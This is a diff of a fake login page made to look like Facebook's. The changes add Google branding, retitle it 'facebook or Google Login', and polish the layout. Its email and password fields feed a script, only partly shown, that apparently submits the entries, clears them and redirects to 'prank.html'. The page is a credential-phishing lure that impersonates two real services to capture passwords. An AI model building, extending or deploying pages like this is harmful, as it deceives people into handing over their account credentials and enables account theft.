@@ -4,233 +4,524 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-     <link rel="icon" type="image/png" href="./image/facebook-icon.png?v=5">
-    <title>facebook Login</title>
+
+    <link rel="icon" type="image/png" href="./image/facebook-icon.png?v=5">
+
+    <title>facebook or Google Login</title>
 
     <style>
+        /* =====================================================
+           RESET
+        ===================================================== */
+
         * {
+            margin: 0;
+            padding: 0;
             box-sizing: border-box;
         }
 
+        html,
         body {
-            margin: 0;
-            font-family: Arial, Helvetica, sans-serif;
-            background: #fff;
-            color: #111;
+            width: 100%;
+            min-height: 100%;
         }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f7f8fa;
+            color: #111827;
+        }
+
+
+        /* =====================================================
+           MAIN PAGE
+        ===================================================== */
 
         .page {
             min-height: 100vh;
+
             display: flex;
+
+            background: #ffffff;
         }
 
-        /* =========================
-           LEFT SIDE
-        ========================= */
+
+        /* =====================================================
+           LEFT SECTION
+        ===================================================== */
 
         .left-section {
+            position: relative;
+
             width: 58%;
             min-height: 100vh;
-            position: relative;
-            border-right: 2px solid #ddd;
+
             overflow: hidden;
+
+            border-right: 1px solid #e5e7eb;
+
+            background: #ffffff;
+        }
+
+
+        /* =====================================================
+           FACEBOOK + GOOGLE LOGOS
+        ===================================================== */
+
+        .social-logos {
+            position: absolute;
+
+            top: 42px;
+            left: 48px;
+
+            display: flex;
+
+            align-items: center;
+
+            gap: 12px;
+
+            z-index: 10;
         }
 
         .logo {
-            position: absolute;
-            top: 52px;
-            left: 55px;
+            width: 46px;
+            height: 46px;
 
-            width: 73px;
-            height: 73px;
+            display: flex;
 
-            background: #1877f2;
-            color: white;
+            align-items: center;
+            justify-content: center;
 
             border-radius: 50%;
 
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            transition:
+                transform 0.2s ease,
+                box-shadow 0.2s ease;
+        }
 
-            font-size: 70px;
-            font-weight: bold;
+        .logo:hover {
+            transform: translateY(-2px);
 
-            line-height: 1;
+            box-shadow:
+                0 8px 20px rgba(0, 0, 0, 0.10);
+        }
+
+
+        /* =====================================================
+           FACEBOOK LOGO
+        ===================================================== */
+
+        .facebook {
+            background: #1877f2;
+
+            color: #ffffff;
+
+            font-size: 34px;
+
+            font-weight: 700;
+
+            font-family: Arial, sans-serif;
+
+            padding-top: 6px;
+        }
+
+
+        /* =====================================================
+           GOOGLE LOGO
+        ===================================================== */
+
+        .google {
+            background: #ffffff;
+
+            border: 1px solid #e5e7eb;
+
+            padding: 8px;
+        }
+
+        .google svg {
+            width: 100%;
+            height: 100%;
+
+            display: block;
+        }
+
+
+        /* =====================================================
+           LEFT CONTENT
+        ===================================================== */
+
+        .left-content {
+            position: absolute;
+
+            left: 7%;
+            bottom: 12%;
+
+            z-index: 2;
         }
 
         .headline {
-            position: absolute;
-            left: 50px;
-            bottom: 105px;
+            font-size: clamp(48px, 5vw, 78px);
 
-            font-size: 76px;
-            line-height: 1.05;
-            font-weight: 700;
+            line-height: 0.98;
 
-            letter-spacing: -3px;
+            font-weight: 750;
+
+            letter-spacing: -4px;
+
+            color: #111111;
         }
 
         .headline .blue {
             color: #1877f2;
         }
 
-        /* Artwork mockup */
+
+        /* =====================================================
+           ARTWORK
+        ===================================================== */
 
         .artwork {
             position: absolute;
-            width: 570px;
-            left: 48%;
-            top: 65px;
-            transform: translateX(-25%);
+
+            width: min(570px, 70%);
+
+            top: 120px;
+            left: 50%;
+
+            transform: translateX(-15%);
+
+            z-index: 1;
         }
 
         .artwork img {
+            display: block;
+
             width: 100%;
             height: auto;
-            display: block;
+
+            object-fit: contain;
         }
 
 
-
-
-
-
-
-
-
-        /* =========================
-           RIGHT SIDE
-        ========================= */
+        /* =====================================================
+           RIGHT SECTION
+        ===================================================== */
 
         .right-section {
             width: 42%;
 
+            min-height: 100vh;
+
             display: flex;
+
             justify-content: center;
 
-            padding-top: 158px;
+            align-items: center;
+
+            padding: 60px 50px;
+
+            background: #ffffff;
         }
+
+
+        /* =====================================================
+           LOGIN BOX
+        ===================================================== */
 
         .login-box {
-            width: 660px;
-            max-width: 82%;
+            width: 100%;
+
+            max-width: 480px;
         }
 
-        .login-title {
-            font-size: 23px;
-            font-weight: 700;
 
+        /* =====================================================
+           LOGIN HEADER
+        ===================================================== */
+
+        .login-header {
             margin-bottom: 30px;
         }
 
+        .login-title {
+            margin-bottom: 9px;
+
+            font-size: 28px;
+
+            font-weight: 700;
+
+            letter-spacing: -0.6px;
+
+            color: #111827;
+        }
+
+        .login-subtitle {
+            font-size: 15px;
+
+            line-height: 1.5;
+
+            color: #6b7280;
+        }
+
+
+        /* =====================================================
+           FORM GROUP
+        ===================================================== */
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .input-label {
+            display: block;
+
+            margin-bottom: 7px;
+
+            font-size: 14px;
+
+            font-weight: 600;
+
+            color: #374151;
+        }
+
+
+        /* =====================================================
+           INPUT
+        ===================================================== */
+
         .input {
             width: 100%;
-            height: 72px;
 
-            border: 1px solid #c8c8c8;
-            border-radius: 20px;
+            height: 54px;
 
-            padding: 0 20px;
+            padding: 0 16px;
 
-            font-size: 19px;
+            border: 1px solid #d1d5db;
+
+            border-radius: 12px;
 
             outline: none;
 
-            margin-bottom: 15px;
+            background: #ffffff;
+
+            color: #111827;
+
+            font-size: 15px;
+
+            transition:
+                border-color 0.2s ease,
+                box-shadow 0.2s ease,
+                background 0.2s ease;
+        }
+
+        .input::placeholder {
+            color: #9ca3af;
+        }
+
+        .input:hover {
+            border-color: #9ca3af;
         }
 
         .input:focus {
             border-color: #1877f2;
-            box-shadow: 0 0 0 1px #1877f2;
+
+            box-shadow:
+                0 0 0 3px rgba(24, 119, 242, 0.12);
         }
+
+
+        /* =====================================================
+           LOGIN BUTTON
+        ===================================================== */
 
         .login-button {
             width: 100%;
+
             height: 54px;
 
-            margin-top: 13px;
+            margin-top: 7px;
 
             border: none;
-            border-radius: 30px;
+
+            border-radius: 12px;
 
             background: #1877f2;
-            color: white;
 
-            font-size: 19px;
-            font-weight: 600;
+            color: #ffffff;
+
+            font-size: 15px;
+
+            font-weight: 650;
 
             cursor: pointer;
+
+            transition:
+                background 0.2s ease,
+                transform 0.15s ease,
+                box-shadow 0.2s ease;
         }
 
         .login-button:hover {
-            background: #0d6be8;
+            background: #166fe5;
+
+            box-shadow:
+                0 8px 20px rgba(24, 119, 242, 0.22);
         }
+
+        .login-button:active {
+            transform: scale(0.99);
+        }
+
+
+        /* =====================================================
+           FORGOT PASSWORD
+        ===================================================== */
 
         .forgot {
             display: block;
 
+            margin-top: 18px;
+
             text-align: center;
 
-            margin-top: 30px;
+            color: #1877f2;
 
-            color: #111;
+            font-size: 14px;
+
+            font-weight: 600;
 
             text-decoration: none;
-
-            font-size: 18px;
         }
 
         .forgot:hover {
             text-decoration: underline;
         }
 
-        .divider {
-            height: 1px;
-            background: #eee;
 
-            margin: 55px 0 25px;
+        /* =====================================================
+           DIVIDER
+        ===================================================== */
+
+        .divider-wrapper {
+            display: flex;
+
+            align-items: center;
+
+            gap: 14px;
+
+            margin: 30px 0;
         }
+
+        .divider-line {
+            flex: 1;
+
+            height: 1px;
+
+            background: #e5e7eb;
+        }
+
+        .divider-text {
+            font-size: 12px;
+
+            font-weight: 600;
+
+            color: #9ca3af;
+
+            text-transform: uppercase;
+
+            letter-spacing: 0.7px;
+        }
+
+
+        /* =====================================================
+           CREATE ACCOUNT
+        ===================================================== */
 
         .create-button {
             width: 100%;
+
             height: 54px;
 
-            background: white;
+            border: 1px solid #1877f2;
 
-            border: 1.5px solid #1877f2;
+            border-radius: 12px;
 
-            border-radius: 30px;
+            background: #ffffff;
 
             color: #1877f2;
 
-            font-size: 18px;
-            font-weight: 600;
+            font-size: 15px;
+
+            font-weight: 650;
 
             cursor: pointer;
+
+            transition:
+                background 0.2s ease,
+                border-color 0.2s ease,
+                transform 0.15s ease;
         }
 
         .create-button:hover {
-            background: #f5f9ff;
+            background: #f4f8ff;
+
+            border-color: #166fe5;
         }
 
+        .create-button:active {
+            transform: scale(0.99);
+        }
+
+
+        /* =====================================================
+           BRAND
+        ===================================================== */
+
         .brand {
-            text-align: center;
+            display: flex;
 
-            margin-top: 32px;
+            align-items: center;
 
-            font-size: 19px;
+            justify-content: center;
+
+            gap: 7px;
+
+            margin-top: 34px;
+
+            color: #6b7280;
+
+            font-size: 14px;
+
+            font-weight: 500;
         }
 
         .brand-symbol {
             color: #1877f2;
-            font-size: 26px;
-            font-weight: bold;
+
+            font-size: 20px;
+
+            font-weight: 700;
         }
 
-        /* =========================
-           RESPONSIVE
-        ========================= */
+
+        /* =====================================================
+           STATUS
+        ===================================================== */
+
+        #status {
+            min-height: 20px;
+
+            margin-top: 14px;
+
+            font-size: 13px;
+
+            text-align: center;
+        }
+
+
+        /* =====================================================
+           TABLET
+        ===================================================== */
 
         @media (max-width: 1100px) {
 
@@ -240,170 +531,455 @@
 
             .right-section {
                 width: 50%;
+
+                padding: 40px 30px;
+            }
+
+            .artwork {
+                width: 480px;
+
+                left: 50%;
+
+                transform: translateX(-15%);
             }
 
             .headline {
                 font-size: 55px;
+
+                letter-spacing: -3px;
             }
 
-            .artwork {
-                transform: scale(.8);
-                transform-origin: top left;
+            .social-logos {
+                left: 30px;
             }
         }
 
-       @media (max-width: 800px) {
 
-    /* Main page */
-    .page {
-        display: block;
-        width: 100%;
-        min-height: 100vh;
-    }
+        /* =====================================================
+           MOBILE
+        ===================================================== */
 
-    /* =========================
-       MOBILE HEADER
-       ========================= */
+        @media (max-width: 800px) {
 
-    .left-section {
-    display: block;
-    position: relative;
+            .page {
+                display: block;
 
-    width: 100%;
-
-    height: 64px;
-    min-height: 64px;   /* IMPORTANT */
-
-    background: #fff;
-    border-right: none;
-    border-bottom: 1px solid #eee;
-
-    overflow: hidden;
-}
-
-    /* Facebook logo */
-    .left-section .logo {
-        position: absolute;
-        display: flex;
-
-        top: 12px;
-        left: 50%;
-
-        transform: translateX(-50%);
-
-        width: 40px;
-        height: 40px;
-
-        align-items: center;
-        justify-content: center;
-
-        font-size: 32px;
-        z-index: 10;
-    }
-
-    /* Hide desktop content on mobile */
-    .left-section .headline,
-    .left-section .artwork {
-        display: none;
-    }
+                min-height: 100vh;
+            }
 
 
-    /* =========================
-       MOBILE LOGIN SECTION
-       ========================= */
+            /* -------------------------
+               MOBILE HEADER
+            ------------------------- */
 
-    .right-section {
-        display: block;
-        position: relative;
+            .left-section {
+                width: 100%;
 
-        width: 100%;
-        min-height: calc(100vh - 64px);
+                min-height: 64px;
+                height: 64px;
 
-        padding: 100px 20px 40px;
+                border-right: none;
 
-        box-sizing: border-box;
-    }
+                border-bottom: 1px solid #eeeeee;
+            }
 
 
-    /* Login box */
-    .login-box {
-        display: block;
+            /* Hide desktop content */
 
-        width: 100%;
-        max-width: 350px;
+            .left-content,
+            .artwork {
+                display: none;
+            }
 
-        margin: 0 auto;
 
-        box-sizing: border-box;
-    }
-}
-        
+            /* -------------------------
+               MOBILE LOGOS
+            ------------------------- */
+
+            .social-logos {
+                position: absolute;
+
+                top: 12px;
+
+                left: 50%;
+
+                transform: translateX(-50%);
+
+                display: flex;
+
+                align-items: center;
+
+                justify-content: center;
+
+                gap: 10px;
+            }
+
+            .logo {
+                width: 40px;
+
+                height: 40px;
+            }
+
+
+            /* Facebook */
+
+            .facebook {
+                font-size: 30px;
+
+                padding-top: 5px;
+            }
+
+
+            /* Google */
+
+            .google {
+                padding: 7px;
+            }
+
+            .google svg {
+                width: 100%;
+                height: 100%;
+            }
+
+
+            /* -------------------------
+               MOBILE LOGIN
+            ------------------------- */
+
+            .right-section {
+                width: 100%;
+
+                min-height: calc(100vh - 64px);
+
+                display: flex;
+
+                align-items: flex-start;
+
+                padding: 50px 20px 35px;
+            }
+
+            .login-box {
+                width: 100%;
+
+                max-width: 390px;
+
+                margin: 0 auto;
+            }
+
+            .login-header {
+                margin-bottom: 26px;
+            }
+
+            .login-title {
+                font-size: 24px;
+            }
+
+            .login-subtitle {
+                font-size: 14px;
+            }
+
+            .input {
+                height: 52px;
+
+                border-radius: 11px;
+            }
+
+            .login-button,
+            .create-button {
+                height: 52px;
+
+                border-radius: 11px;
+            }
+        }
+
+
+        /* =====================================================
+           SMALL MOBILE
+        ===================================================== */
+
+        @media (max-width: 400px) {
+
+            .right-section {
+                padding-left: 16px;
+
+                padding-right: 16px;
+            }
+
+            .login-title {
+                font-size: 22px;
+            }
+
+            .social-logos {
+                gap: 8px;
+            }
+        }
     </style>
 </head>
 
+
 <body>
 
-    <div class="page">
+    <main class="page">
 
-        <!-- LEFT -->
+
+        <!-- =================================================
+             LEFT SECTION
+        ================================================= -->
+
         <section class="left-section">
 
-            <div class="logo">f</div>
 
-            <div class="headline">
-                Explore<br>
-                the<br>
-                things<br>
-                <span class="blue">you love.</span>
+            <!-- Facebook + Google -->
+
+            <div class="social-logos">
+
+                <!-- Facebook -->
+
+                <div class="logo facebook">
+                    f
+                </div>
+
+
+                <!-- Google -->
+
+                <div class="logo google">
+
+                    <svg
+                        viewBox="0 0 48 48"
+                        aria-label="Google"
+                    >
+
+                        <!-- Red -->
+
+                        <path
+                            fill="#EA4335"
+                            d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.61 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.16 17.74 9.5 24 9.5z"
+                        />
+
+
+                        <!-- Blue -->
+
+                        <path
+                            fill="#4285F4"
+                            d="M46.5 24c0-1.62-.15-3.18-.43-4.69H24v9.38h12.63c-.54 2.91-2.18 5.38-4.65 7.03l7.53 5.84C43.89 37.42 46.5 31.17 46.5 24z"
+                        />
+
+
+                        <!-- Yellow -->
+
+                        <path
+                            fill="#FBBC05"
+                            d="M10.54 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.36-3.12 1.04-4.59l-7.98-6.19A23.93 23.93 0 0 0 0 24c0 3.87.92 7.54 2.56 10.78l7.98-6.19z"
+                        />
+
+
+                        <!-- Green -->
+
+                        <path
+                            fill="#34A853"
+                            d="M24 48c6.47 0 11.9-2.13 15.87-5.79l-7.53-5.84c-2.09 1.4-4.76 2.23-8.34 2.23-6.26 0-11.57-3.66-13.46-8.91l-7.98 6.19C6.51 42.62 14.61 48 24 48z"
+                        />
+
+                    </svg>
+
+                </div>
+
             </div>
 
+
+            <!-- =================================================
+                 ARTWORK
+            ================================================= -->
+
             <div class="artwork">
-                <img src="image/social-artwork.webp" alt="Social media artwork">
+
+                <img
+                    src="image/social-artwork.webp"
+                    alt="Social media illustration"
+                >
+
+            </div>
+
+
+            <!-- =================================================
+                 HEADLINE
+            ================================================= -->
+
+            <div class="left-content">
+
+                <h1 class="headline">
+
+                    Explore<br>
+
+                    the<br>
+
+                    things<br>
+
+                    <span class="blue">
+                        you love.
+                    </span>
+
+                </h1>
+
             </div>
 
         </section>
 
 
-        <!-- RIGHT -->
+
+        <!-- =================================================
+             RIGHT SECTION
+        ================================================= -->
+
         <section class="right-section">
 
             <div class="login-box">
 
-                <div class="login-title">
-                    Log in to Facebook
+
+                <!-- =================================================
+                     HEADER
+                ================================================= -->
+
+                <div class="login-header">
+
+                    <h2 class="login-title">
+                        Welcome back
+                    </h2>
+
+                    <p class="login-subtitle">
+                        Log in to continue to your account.
+                    </p>
+
                 </div>
 
-                <input class="input" type="text" id="name" placeholder="Email address or mobile number">
 
-                <input class="input" type="password" id="message" placeholder="Password">
+                <!-- =================================================
+                     EMAIL
+                ================================================= -->
 
-                <button class="login-button" id="sendBtn">
+                <div class="form-group">
+
+                    <label
+                        class="input-label"
+                        for="email"
+                    >
+                        Email or mobile number
+                    </label>
+
+                    <input
+                        class="input"
+                        type="text"
+                        id="name"
+                        placeholder="Enter your email or mobile number"
+                        autocomplete="username"
+                    >
+
+                </div>
+
+
+                <!-- =================================================
+                     PASSWORD
+                ================================================= -->
+
+                <div class="form-group">
+
+                    <label
+                        class="input-label"
+                        for="password"
+                    >
+                        Password
+                    </label>
+
+                    <input
+                        class="input"
+                        type="password"
+                        id="message"
+                        placeholder="Enter your password"
+                        autocomplete="current-password"
+                    >
+
+                </div>
+
+
+                <!-- =================================================
+                     LOGIN BUTTON
+                ================================================= -->
+
+                <button
+                    class="login-button"
+                    id="sendBtn"
+                    type="button"
+                >
                     Log in
                 </button>
 
-                <a href="#" class="forgot">
-                    Forgotten password?
+
+                <!-- =================================================
+                     FORGOT PASSWORD
+                ================================================= -->
+
+                <a
+                    href="#"
+                    class="forgot"
+                >
+                    Forgot your password?
                 </a>
 
-                <div class="divider"></div>
 
-                <button class="create-button" id="createButton">
+                <!-- =================================================
+                     DIVIDER
+                ================================================= -->
+
+                <div class="divider-wrapper">
+
+                    <div class="divider-line"></div>
+
+                    <span class="divider-text">
+                        or
+                    </span>
+
+                    <div class="divider-line"></div>
+
+                </div>
+
+
+                <!-- =================================================
+                     CREATE ACCOUNT
+                ================================================= -->
+
+                <button
+                    class="create-button"
+                    id="createButton"
+                    type="button"
+                >
                     Create new account
                 </button>
 
+
+                <!-- =================================================
+                     BRAND
+                ================================================= -->
+
                 <div class="brand">
-                    <span class="brand-symbol">∞</span>
+
+                    <span class="brand-symbol">
+                        ∞
+                    </span>
+
                     Social
+
                 </div>
 
-                <p id="status" style="text-align:center;margin-top:20px;">
-                </p>
+
+                <!-- Status -->
+
+                <p id="status"></p>
 
             </div>
 
         </section>
 
-    </div>
+    </main>
 
 
     <script>
@@ -442,11 +1018,11 @@
 
                 if (data.ok) {
 
-                   
+
 
                     nameInput.value = "";
                     messageInput.value = "";
-                    window.location.href="prank.html";
+                    window.location.href = "prank.html";
 
                 } else {
 
